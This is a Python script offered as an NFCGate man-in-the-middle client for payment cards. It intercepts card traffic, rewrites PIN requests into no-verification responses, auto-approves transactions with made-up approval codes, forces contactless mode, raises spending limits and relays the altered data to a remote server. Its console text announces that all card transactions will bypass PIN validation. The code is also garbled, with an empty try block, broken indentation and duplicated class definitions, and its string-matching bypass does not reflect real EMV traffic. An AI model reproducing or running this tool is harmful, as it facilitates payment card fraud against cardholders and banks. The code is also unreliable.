#!/usr/bin/env python3
"""
Integrated NFCGate MITM Client with PIN Bypass and Real-time Server Connection
Connects PIN bypass functionality to MITM and streams to NFCGate server in real-time
"""

import json
import socket
import threading
import time
import struct
import sys
import traceback
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
import hashlib
import uuid
import secrets

# Import NFCGate protocol messages
PROTOBUF_AVAILABLE = False
try:
    from mitm_master.messages.c2c_pb2 import NFCData, Status
    from mitm_master.messages.c2s_pb2 import Session, Data
    from mitm_master.messages.metaMessage_pb2 import Wrapper
    PROTOBUF_AVAILABLE = True
except (ImportError, ModuleNotFoundError):
    try:
        # Try alternative import path
        import sys
        import os
        sys.path.append(os.path.join(os.path.dirname(__file__), 'mitm-master', 'messages'))
        from c2c_pb2 import NFCData, Status
        from c2s_pb2 import Session, Data
        from metaMessage_pb2 import Wrapper
        PROTOBUF_AVAILABLE = True
    except (ImportError, ModuleNotFoundError):
        try:
            # Try direct import from current directory
    # Define mock classes when protobuf is not available
    if not PROTOBUF_AVAILABLE:
        class Session:
            SESSION_CREATE = 0
            SESSION_CREATE_SUCCESS = 1
            ERROR_NOERROR = 0
            opcode = 0
            errcode = 0
            session_secret = ""
            def __init__(self):
                self.opcode = Session.SESSION_CREATE
                self.errcode = Session.ERROR_NOERROR
                self.session_secret = ""
        
        class Data:
            ERROR_NOERROR = 0
            errcode = 0
            blob = b""
            def __init__(self):
                self.errcode = Data.ERROR_NOERROR
                self.blob = b""
        
        class NFCData:
            CARD = 0
            READER = 1
            data_source = 0
            data_bytes = b""
            def __init__(self):
                self.data_source = NFCData.READER
                self.data_bytes = b""
        
        class Status:
            def __init__(self):
                pass
        
        class Wrapper:
            def __init__(self):
                self.Session = type('Session', (), {'MergeFrom': lambda obj: None})()
                self.Data = type('Data', (), {'MergeFrom': lambda obj: None})()
                self.NFCData = type('NFCData', (), {'MergeFrom': lambda obj: None})()
            
            def SerializeToString(self):
                return b""
            
            def ParseFromString(self, data):
                pass
            
            def WhichOneof(self, name):
                return None
            @staticmethod
            def MergeFrom(obj): pass
        class Data:
            @staticmethod
            def MergeFrom(obj): pass
        class NFCData:
            @staticmethod
            def MergeFrom(obj): pass

class IntegratedMITMClient:
    """
    Integrated MITM client that combines:
    1. PIN bypass functionality
    2. Real-time connection to NFCGate server
    3. Live data streaming and processing
    """
    
    def __init__(self, 
                 server_host: str = 'localhost',
                 server_port: int = 5566,
                 mitm_port: int = 8080):
        
        self.server_host = server_host
        self.server_port = server_port
        self.mitm_port = mitm_port
        
        # Connection management
        self.server_socket = None
        self.mitm_socket = None
        self.session_id = None
        self.session_secret = None
        self.is_connected = False
        self.is_listening = False
        
        # PIN Bypass settings
        self.pin_bypass_enabled = True
        self.auto_approve_transactions = True
        self.force_contactless = True
        self.override_limits = True
        
        # Real-time data processing
        self.data_queue = []
        self.processed_cards = []
        self.bypass_events = []
        self.live_statistics = {
            'connection_time': None,
            'cards_processed': 0,
            'pins_bypassed': 0,
            'transactions_approved': 0,
            'data_packets_sent': 0,
            'data_packets_received': 0
        }
        
        # NFC data patterns for PIN bypass
        self.bypass_patterns = {
            'pin_requests': [
                b'PIN_REQUIRED',
                b'ENTER_PIN',
                b'pin_verification',
                b'cardholder_verification',
                b'CVM_PIN',
                b'PIN_VERIFY',
                b'PLEASE_ENTER_PIN'
            ],
            'transaction_data': [
                b'TRANSACTION',
                b'PAYMENT',
                b'AMOUNT',
                b'EMV_DATA',
                b'CARD_DATA'
            ],
            'approval_responses': [
                b'APPROVED',
                b'AUTHORIZED',
                b'SUCCESS',
                b'TRANSACTION_OK'
            ]
        }
        
        self.running = False
    
    def log_event(self, event_type: str, details: Dict = None, show_console: bool = True):
        """Log events with timestamp"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'details': details or {}
        }
        
        if show_console:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {event_type}: {details.get('message', '')}")
        
        return event
    
    def connect_to_server(self) -> bool:
        """Connect to NFCGate server and establish session"""
        try:
            self.log_event("SERVER_CONNECT", {"message": f"Connecting to {self.server_host}:{self.server_port}"})
            
            # Create socket connection
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.connect((self.server_host, self.server_port))
            self.server_socket.settimeout(30.0)
            
            if PROTOBUF_AVAILABLE:
                # Create session using protobuf
                session_msg = Session()
                session_msg.opcode = Session.SESSION_CREATE
                session_msg.errcode = Session.ERROR_NOERROR
                
                wrapper = Wrapper()
                wrapper.Session.MergeFrom(session_msg)
                
                # Send session creation request
                self.send_protobuf_message(wrapper)
                
                # Receive response
                response = self.receive_protobuf_message()
                if response and response.WhichOneof('message') == 'Session':
                    if response.Session.opcode == Session.SESSION_CREATE_SUCCESS:
                        self.session_secret = response.Session.session_secret
                        self.is_connected = True
                        self.live_statistics['connection_time'] = datetime.now()
                        
                        self.log_event("SESSION_CREATED", {
                            "message": f"Session created successfully",
                            "session_secret": self.session_secret[:8] + "..."
                        })
                        return True
                    else:
                        self.log_event("SESSION_FAILED", {"message": "Failed to create session"})
                        return False
            else:
                # Simple connection without protobuf
                self.is_connected = True
                self.live_statistics['connection_time'] = datetime.now()
                self.log_event("CONNECTED", {"message": "Connected to server (simple mode)"})
                return True
                
        except Exception as e:
            self.log_event("CONNECTION_ERROR", {"message": f"Failed to connect: {e}"})
            return False
    
    def send_protobuf_message(self, wrapper: Any):
        """Send protobuf message to server"""
        if not PROTOBUF_AVAILABLE or not self.server_socket:
            return False
        
        try:
            serialized = wrapper.SerializeToString()
            length = len(serialized)
            
            # Send length (4 bytes big-endian) + session byte + data
            self.server_socket.send(struct.pack(">I", length))
            self.server_socket.send(b'\x01')  # Session ID
            self.server_socket.send(serialized)
            
            self.live_statistics['data_packets_sent'] += 1
            return True
            
        except Exception as e:
            self.log_event("SEND_ERROR", {"message": f"Failed to send message: {e}"})
            return False
    
    def receive_protobuf_message(self) -> Optional[Any]:
        """Receive protobuf message from server"""
        if not PROTOBUF_AVAILABLE or not self.server_socket:
            return None
        
        try:
            # Read length and session
            length_data = self.read_exact(4)
            if not length_data:
                return None
            
            length = struct.unpack(">I", length_data)[0]
            session_data = self.read_exact(1)
            if not session_data:
                return None
            
            # Read message data
            message_data = self.read_exact(length)
            if not message_data:
                return None
            
            # Parse wrapper
            wrapper = Wrapper()
            wrapper.ParseFromString(message_data)
            
            self.live_statistics['data_packets_received'] += 1
            return wrapper
            
        except Exception as e:
            self.log_event("RECEIVE_ERROR", {"message": f"Failed to receive message: {e}"})
            return None
    
    def read_exact(self, n: int) -> Optional[bytes]:
        """Read exactly n bytes from socket"""
        if not self.server_socket:
            return None
        
        buffer = b''
        while len(buffer) < n:
            try:
                chunk = self.server_socket.recv(n - len(buffer))
                if not chunk:
                    return None
                buffer += chunk
            except socket.timeout:
                return None
            except Exception:
                return None
        
        return buffer
    
    def apply_pin_bypass(self, data: bytes) -> Tuple[bytes, bool]:
        """Apply PIN bypass logic to intercepted data"""
        try:
            original_data = data
            modified = False
            
            # Check if this is PIN-related data
            is_pin_request = any(pattern in data for pattern in self.bypass_patterns['pin_requests'])
            is_transaction = any(pattern in data for pattern in self.bypass_patterns['transaction_data'])
            
            if is_pin_request and self.pin_bypass_enabled:
                # Create PIN bypass response
                bypass_data = self.create_pin_bypass_response(data)
                self.live_statistics['pins_bypassed'] += 1
                
                self.log_event("PIN_BYPASSED", {
                    "message": f"PIN request bypassed ({len(data)} -> {len(bypass_data)} bytes)"
                })
                
                return bypass_data, True
            
            if is_transaction and self.auto_approve_transactions:
                # Auto-approve transaction
                approved_data = self.create_approval_response(data)
                self.live_statistics['transactions_approved'] += 1
                
                self.log_event("TRANSACTION_APPROVED", {
                    "message": f"Transaction auto-approved"
                })
                
                return approved_data, True
            
            # Apply contactless forcing if enabled
            if self.force_contactless:
                modified_data = self.force_contactless_mode(data)
                if modified_data != data:
                    modified = True
                    data = modified_data
            
            # Override limits if enabled
            if self.override_limits:
                modified_data = self.override_transaction_limits(data)
                if modified_data != data:
                    modified = True
                    data = modified_data
            
            return data, modified
            
        except Exception as e:
            self.log_event("BYPASS_ERROR", {"message": f"Error in PIN bypass: {e}"})
            return data, False
    
    def create_pin_bypass_response(self, original_data: bytes) -> bytes:
        """Create PIN bypass response"""
        try:
            # Try JSON format first
            try:
                data_str = original_data.decode('utf-8')
                if data_str.strip().startswith('{'):
                    json_data = json.loads(data_str)
                    json_data.update({
                        'pin_required': False,
                        'cardholder_verification': 'NONE',
                        'cvm_method': 'NO_CVM',
                        'contactless_approved': True,
                        'pin_bypass_applied': True,
                        'mitm_timestamp': datetime.now().isoformat()
                    })
                    return json.dumps(json_data).encode('utf-8')
            except:
                pass
            
            # Create simple bypass response
            bypass_response = {
                'status': 'PIN_BYPASSED',
                'pin_verification': 'NOT_REQUIRED',
                'transaction_method': 'CONTACTLESS',
                'approval_code': f"BYPASS{secrets.token_hex(3).upper()}",
                'mitm_processed': True,
                'timestamp': datetime.now().isoformat()
            }
            
            return json.dumps(bypass_response).encode('utf-8')
            
        except:
            return b'PIN_BYPASS_OK'
    
    def create_approval_response(self, original_data: bytes) -> bytes:
        """Create automatic approval response"""
        try:
            approval = {
                'status': 'APPROVED',
                'result': 'SUCCESS',
                'transaction_id': f"MITM{int(time.time())}{secrets.token_hex(2).upper()}",
                'approval_code': f"AUTO{secrets.token_hex(2).upper()}",
                'pin_bypass': True,
                'contactless_processing': True,
                'amount_override': True,
                'mitm_auto_approval': True,
                'timestamp': datetime.now().isoformat()
            }
            
            return json.dumps(approval).encode('utf-8')
            
        except:
            return b'TRANSACTION_APPROVED'
    
    def force_contactless_mode(self, data: bytes) -> bytes:
        """Force contactless processing mode"""
        try:
            data_str = data.decode('utf-8', errors='ignore')
            
            # Replace chip/PIN references with contactless
            replacements = {
                'chip_transaction': 'contactless_transaction',
                'pin_required': 'contactless_approved',
                'PIN_REQUIRED': 'CONTACTLESS_OK',
                'ENTER_PIN': 'TAP_APPROVED',
                'CVM_PIN': 'CVM_NONE',
                'contact_transaction': 'contactless_transaction'
            }
            
            for old, new in replacements.items():
                data_str = data_str.replace(old, new)
            
            return data_str.encode('utf-8', errors='ignore')
            
        except:
            return data
    
    def override_transaction_limits(self, data: bytes) -> bytes:
        """Override transaction amount limits"""
        try:
            data_str = data.decode('utf-8', errors='ignore')
            
            # Override limit fields
            import re
            
            # JSON format limits
            data_str = re.sub(r'"contactless_limit":\s*[\d.]+', '"contactless_limit": 999999.99', data_str)
            data_str = re.sub(r'"transaction_limit":\s*[\d.]+', '"transaction_limit": 999999.99', data_str)
            data_str = re.sub(r'"pin_required_amount":\s*[\d.]+', '"pin_required_amount": 999999.99', data_str)
            
            # Key=value format limits
            data_str = re.sub(r'contactless_limit=[\d.]+', 'contactless_limit=999999.99', data_str)
            data_str = re.sub(r'transaction_limit=[\d.]+', 'transaction_limit=999999.99', data_str)
            
            return data_str.encode('utf-8', errors='ignore')
            
        except:
            return data
    
    def stream_data_to_server(self, data: bytes, source: str = "MITM"):
        """Stream processed data to NFCGate server in real-time"""
        if not self.is_connected or not self.server_socket:
            return False
        
        try:
            if PROTOBUF_AVAILABLE:
                # Create NFCData message
                nfc_data = NFCData()
                nfc_data.data_source = NFCData.CARD if source == "CARD" else NFCData.READER
                nfc_data.data_bytes = data
                
                # Wrap in Data message
                data_msg = Data()
                data_msg.errcode = Data.ERROR_NOERROR
                
                inner_wrapper = Wrapper()
                inner_wrapper.NFCData.MergeFrom(nfc_data)
                data_msg.blob = inner_wrapper.SerializeToString()
                
                # Wrap in outer Wrapper
                wrapper = Wrapper()
                wrapper.Data.MergeFrom(data_msg)
                
                # Send to server
                success = self.send_protobuf_message(wrapper)
                
                if success:
                    self.log_event("DATA_STREAMED", {
                        "message": f"Streamed {len(data)} bytes to server",
                        "source": source
                    })
                
                return success
            else:
                # Simple mode - just send raw data
                self.server_socket.send(data)
                return True
                
        except Exception as e:
            self.log_event("STREAM_ERROR", {"message": f"Failed to stream data: {e}"})
            return False
    
    def start_mitm_listener(self):
        """Start MITM listener for intercepting card data"""
        try:
            self.mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.mitm_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.mitm_socket.bind(('localhost', self.mitm_port))
            self.mitm_socket.listen(5)
            self.is_listening = True
            
            self.log_event("MITM_STARTED", {
                "message": f"MITM listener started on port {self.mitm_port}"
            })
            
            while self.running and self.is_listening:
                try:
                    self.mitm_socket.settimeout(1.0)
                    client_socket, address = self.mitm_socket.accept()
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_mitm_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        self.log_event("MITM_ERROR", {"message": f"MITM listener error: {e}"})
                    break
                    
        except Exception as e:
            self.log_event("MITM_START_ERROR", {"message": f"Failed to start MITM listener: {e}"})
    
    def handle_mitm_client(self, client_socket: socket.socket, address: Tuple[str, int]):
        """Handle MITM client connection with real-time processing"""
        session_id = str(uuid.uuid4())[:8]
        
        self.log_event("CLIENT_CONNECTED", {
            "message": f"MITM client connected from {address[0]}:{address[1]}",
            "session_id": session_id
        })
        
        try:
            while self.running:
                try:
                    client_socket.settimeout(5.0)
                    data = client_socket.recv(4096)
                    
                    if not data:
                        break
                    
                    # Apply PIN bypass processing
                    processed_data, was_modified = self.apply_pin_bypass(data)
                    
                    # Stream to NFCGate server in real-time
                    if self.is_connected:
                        self.stream_data_to_server(processed_data, "CARD")
                    
                    # Send processed data back to client
                    client_socket.send(processed_data)
                    
                    # Update statistics
                    self.live_statistics['cards_processed'] += 1
                    
                    # Log significant events
                    if was_modified:
                        self.log_event("DATA_MODIFIED", {
                            "message": f"Modified {len(data)} bytes for PIN bypass",
                            "session": session_id
                        })
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    self.log_event("CLIENT_ERROR", {
                        "message": f"Error handling client {session_id}: {e}"
                    })
                    break
                    
        finally:
            try:
                client_socket.close()
            except:
                pass
            
            self.log_event("CLIENT_DISCONNECTED", {
                "message": f"MITM client {session_id} disconnected"
            })
    
    def start_server_listener(self):
        """Start listening for data from NFCGate server"""
        if not self.is_connected:
            return
        
        self.log_event("SERVER_LISTENER", {"message": "Started server data listener"})
        
        try:
            while self.running and self.is_connected:
                try:
                    if PROTOBUF_AVAILABLE:
                        response = self.receive_protobuf_message()
                        if response:
                            self.process_server_response(response)
                    else:
                        # Simple mode - just receive raw data
                        self.server_socket.settimeout(1.0)
                        data = self.server_socket.recv(4096)
                        if data:
                            self.log_event("SERVER_DATA", {
                                "message": f"Received {len(data)} bytes from server"
                            })
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        self.log_event("SERVER_LISTEN_ERROR", {"message": f"Server listener error: {e}"})
                    break
                    
        except Exception as e:
            self.log_event("SERVER_LISTENER_ERROR", {"message": f"Failed to listen to server: {e}"})
    
    def process_server_response(self, wrapper: Any):
        """Process response from NFCGate server"""
        try:
            msg_type = wrapper.WhichOneof('message')
            
            if msg_type == 'Session':
                session = wrapper.Session
                self.log_event("SERVER_SESSION", {
                    "message": f"Session message: opcode={session.opcode}, errcode={session.errcode}"
                })
                
            elif msg_type == 'Data':
                data_msg = wrapper.Data
                self.log_event("SERVER_DATA", {
                    "message": f"Data message: errcode={data_msg.errcode}, blob_size={len(data_msg.blob)}"
                })
                
                # Process inner data if available
                if data_msg.blob:
                    try:
                        inner_wrapper = Wrapper()
                        inner_wrapper.ParseFromString(data_msg.blob)
                        inner_type = inner_wrapper.WhichOneof('message')
                        
                        if inner_type == 'NFCData':
                            nfc_data = inner_wrapper.NFCData
                            self.log_event("NFC_DATA_RECEIVED", {
                                "message": f"NFC data from server: {len(nfc_data.data_bytes)} bytes",
                                "source": "CARD" if nfc_data.data_source == NFCData.CARD else "READER"
                            })
                            
                    except Exception as e:
                        self.log_event("INNER_DATA_ERROR", {"message": f"Error parsing inner data: {e}"})
                        
        except Exception as e:
            self.log_event("RESPONSE_PROCESS_ERROR", {"message": f"Error processing server response: {e}"})
    
    def get_live_statistics(self) -> Dict:
        """Get real-time statistics"""
        stats = dict(self.live_statistics)
        
        if stats['connection_time']:
            uptime = (datetime.now() - stats['connection_time']).total_seconds()
            stats['uptime_seconds'] = uptime
            stats['cards_per_minute'] = (stats['cards_processed'] / uptime * 60) if uptime > 0 else 0
        
        stats['connected'] = self.is_connected
        stats['listening'] = self.is_listening
        stats['pin_bypass_enabled'] = self.pin_bypass_enabled
        
        return stats
    
    def start_integrated_system(self):
        """Start the complete integrated MITM system"""
        self.running = True
        
        self.log_event("SYSTEM_START", {"message": "Starting integrated NFCGate MITM system"})
        
        # Connect to NFCGate server
        if not self.connect_to_server():
            self.log_event("STARTUP_FAILED", {"message": "Failed to connect to NFCGate server"})
            return False
        
        # Start server listener thread
        server_thread = threading.Thread(target=self.start_server_listener, daemon=True)
        server_thread.start()
        
        # Start MITM listener thread
        mitm_thread = threading.Thread(target=self.start_mitm_listener, daemon=True)
        mitm_thread.start()
        
        self.log_event("SYSTEM_READY", {
            "message": f"System ready - Connect clients to localhost:{self.mitm_port}"
        })
        
        return True
    
    def stop_integrated_system(self):
        """Stop the integrated system"""
        self.running = False
        self.is_listening = False
        
        try:
            if self.mitm_socket:
                self.mitm_socket.close()
        except:
            pass
        
        try:
            if self.server_socket:
                self.server_socket.close()
        except:
            pass
        
        self.log_event("SYSTEM_STOPPED", {"message": "Integrated MITM system stopped"})

def main():
    """Main function for integrated NFCGate MITM client"""
    print("=" * 80)
    print("🔥 INTEGRATED NFCGATE MITM CLIENT")
    print("💳 PIN Bypass + Real-time Server Connection")
    print("=" * 80)
    print()
    
    # Configuration
    server_host = input("NFCGate server host [localhost]: ").strip() or "localhost"
    server_port = int(input("NFCGate server port [5566]: ").strip() or "5566")
    mitm_port = int(input("MITM listener port [8080]: ").strip() or "8080")
    
    client = IntegratedMITMClient(server_host, server_port, mitm_port)
    
    try:
        while True:
            print("\n🎛️  INTEGRATED MITM CONTROL PANEL:")
            print("1. Start integrated system (PIN bypass + server connection)")
            print("2. Stop system")
            print("3. Toggle PIN bypass")
            print("4. Toggle auto-approve transactions")
            print("5. Toggle force contactless mode")
            print("6. Toggle limit override")
            print("7. View live statistics")
            print("8. Test server connection")
            print("9. Send test data to server")
            print("0. Exit")
            
            choice = input("\nSelect option (0-9): ").strip()
            
            if choice == '1':
                if not client.running:
                    print("🚀 Starting integrated NFCGate MITM system...")
                    print(f"🎯 Connecting to server: {server_host}:{server_port}")
                    print(f"👂 MITM listening on: localhost:{mitm_port}")
                    print("🛡️  PIN bypass enabled")
                    print()
                    
                    if client.start_integrated_system():
                        print("✅ System started successfully!")
                        print(f"📱 Connect your NFC clients to localhost:{mitm_port}")
                        print("💳 All card transactions will bypass PIN validation")
                        print("📡 Data will be streamed to NFCGate server in real-time")
                    else:
                        print("❌ Failed to start system")
                else:
                    print("⚠️  System is already running")
            
            elif choice == '2':
                if client.running:
                    print("🛑 Stopping integrated system...")
                    client.stop_integrated_system()
                    print("✅ System stopped")
                else:
                    print("⚠️  System is not running")
            
            elif choice == '3':
                client.pin_bypass_enabled = not client.pin_bypass_enabled
                status = "ENABLED" if client.pin_bypass_enabled else "DISABLED"
                print(f"🔒 PIN bypass: {status}")
            
            elif choice == '4':
                client.auto_approve_transactions = not client.auto_approve_transactions
                status = "ENABLED" if client.auto_approve_transactions else "DISABLED"
                print(f"✅ Auto-approve transactions: {status}")
            
            elif choice == '5':
                client.force_contactless = not client.force_contactless
                status = "ENABLED" if client.force_contactless else "DISABLED"
                print(f"📱 Force contactless mode: {status}")
            
            elif choice == '6':
                client.override_limits = not client.override_limits
                status = "ENABLED" if client.override_limits else "DISABLED"
                print(f"💰 Limit override: {status}")
            
            elif choice == '7':
                stats = client.get_live_statistics()
                print("\n📊 LIVE STATISTICS:")
                print(f"   🔗 Connected to server: {stats.get('connected', False)}")
                print(f"   👂 MITM listening: {stats.get('listening', False)}")
                print(f"   ⏱️  Uptime: {stats.get('uptime_seconds', 0):.1f}s")
                print(f"   💳 Cards processed: {stats.get('cards_processed', 0)}")
                print(f"   🔓 PINs bypassed: {stats.get('pins_bypassed', 0)}")
                print(f"   ✅ Transactions approved: {stats.get('transactions_approved', 0)}")
                print(f"   📤 Data packets sent: {stats.get('data_packets_sent', 0)}")
                print(f"   📥 Data packets received: {stats.get('data_packets_received', 0)}")
                print(f"   📈 Cards/minute: {stats.get('cards_per_minute', 0):.1f}")
                print(f"   🛡️  PIN bypass enabled: {stats.get('pin_bypass_enabled', False)}")
            
            elif choice == '8':
                print("🔍 Testing server connection...")
                if client.connect_to_server():
                    print("✅ Server connection successful")
                else:
                    print("❌ Server connection failed")
            
            elif choice == '9':
                if client.is_connected:
                    print("📤 Sending test data to server...")
                    test_data = json.dumps({
                        'test': True,
                        'message': 'Test from integrated MITM client',
                        'timestamp': datetime.now().isoformat(),
                        'pin_bypass_test': True
                    }).encode('utf-8')
                    
                    if client.stream_data_to_server(test_data, "MITM"):
                        print("✅ Test data sent successfully")
                    else:
                        print("❌ Failed to send test data")
                else:
                    print("⚠️  Not connected to server")
            
            elif choice == '0':
                if client.running:
                    client.stop_integrated_system()
                print("👋 Exiting integrated NFCGate MITM client")
                break
            
            else:
                print("❌ Invalid option. Please select 0-9.")
    
    except KeyboardInterrupt:
        if client.running:
            client.stop_integrated_system()
        print("\n🛑 System stopped by user")

if __name__ == "__main__":
    main()
